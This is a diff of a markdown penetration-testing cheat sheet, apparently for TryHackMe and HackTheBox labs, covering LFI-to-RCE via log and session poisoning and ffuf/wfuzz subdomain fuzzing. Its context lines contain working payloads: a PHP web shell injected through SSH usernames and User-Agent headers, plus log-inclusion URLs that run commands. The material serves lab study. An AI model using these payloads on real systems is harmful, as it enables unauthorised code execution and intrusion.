@@ -87,7 +87,7 @@ http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resourc
 
 * First one will often fail because it attempts to execute the php code, thus converting to ROT13 or base64 will help achieve LFI
 
-#### LFI to RCE via Log Posioning
+### LFI to RCE via Log Poisoning
 
 * First find the log file path and attempt to `curl` to it
 
@@ -96,14 +96,16 @@ user@machine$ curl -A "This is testing" http://10-10-122-235.p.thmlabs.com/login
 ```
 
 * Should see the evidence of your test in the user agent string logged
-* ![1](https://user-images.githubusercontent.com/75596877/145140973-2ab102e2-f40d-4f16-8a0b-a3582f002d46.png)
+*
+
+    <figure><img src="https://user-images.githubusercontent.com/75596877/145140973-2ab102e2-f40d-4f16-8a0b-a3582f002d46.png" alt=""><figcaption></figcaption></figure>
 * Now post php code to the log file and then visit the log file location to execute the php code you just injected
 
 ```
 user@machine$ curl -A "<?php phpinfo();?>" http://10-10-122-235.p.thmlabs.com/login.php
 ```
 
-**LFI to RCE via PHP Sessions**
+### **LFI to RCE via PHP Sessions**
 
 * The LFI to RCE via PHP sessions follows the same concept of the log poisoning technique.
 * PHP sessions are files within the operating system that store temporary information. After the user logs out of the web application, the PHP session information will be deleted.
@@ -130,7 +132,7 @@ c:\Windows\Temp
 https://10-10-122-235.p.thmlabs.com/login.php?err=/tmp/sess_vc4567al6pq7usm2cufmilkm45
 ```
 
-#### RCE via SSH
+### RCE via SSH
 
 * Try to ssh into the box with a PHP code as username .
 
@@ -144,7 +146,7 @@ ssh <?php system($_GET["cmd"]);?>@10.10.10.10
 http://example.com/index.php?page=/var/log/auth.log&cmd=id
 ```
 
-#### RCE via Apache logs
+### RCE via Apache logs
 
 * Poison the User-Agent in access logs:
 
@@ -223,51 +225,6 @@ wfuzz -u http://preprod-payroll.trick.htb/index.php?page=FUZZ -b PHPSESSID=lh8uc
 
 ```
 /usr/share/Seclists/Discovery/Web-Content/burp-parameter-names.txt
-```
-
-* Use FFuF, or wfuzz
-
-### FFuf Fuzzing for subdomains
-
-```
-ffuf -u http://vulnnet.thm -H "Host: FUZZ.vulnnet.thm" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs 5829
-```
-
-* Notice that you will get back responses with a similar character count, these are often the ones that will fail, to make the output more readable, filter on the bad character count and look for one with a unique character count.
-
-#### Another ffuf example
-
-* In this example we know the first part of the subdomain used by the company, however we need to bruteforce the second half of the sub domain.
-
-```
-ffuf -w /mnt/home/dasor/wordlist/directory-list-2.3-big.txt:FUZZ -u http://trick.htb/ -H 'Host: preprod-FUZZ.trick.htb' -v -fs 5480
-```
-
-#### ffuf Filter out 302 redirects when looking for subdomains
-
-* Sometimes the web server will 302 your request when bruteforcing for subdomains.
-* First create a new burp listener as such&#x20;
-
-<figure><img src="../.gitbook/assets/Screenshot_2022-12-17_16-43-20.png" alt=""><figcaption></figcaption></figure>
-
-* Now you can use the below command and throw all the requests through the burp proxy to view the requests
-
-```
-ffuf -u http://localhost:8888 -H "Host: FUZZ.mentorquotes.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 302
-```
-
-* Browsing to burp, we can see all the requests and the 302 redirects.  Try and figure out what stands out, if most requests are 302's look for 404's or other status codes
-
-<figure><img src="../.gitbook/assets/Screenshot_2022-12-17_16_48_47.png" alt=""><figcaption></figcaption></figure>
-
-* Apply our filter removing all 302's
-
-<figure><img src="../.gitbook/assets/Screenshot_2022-12-17_16_48_58.png" alt=""><figcaption></figcaption></figure>
-
-* Below is a command to filter the status code without using a burp proxy
-
-```
-ffuf -u http://mentorquotes.htb -H "Host: FUZZ.mentorquotes.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 302
 ```
 
 ### FFuf API endpoints&#x20;
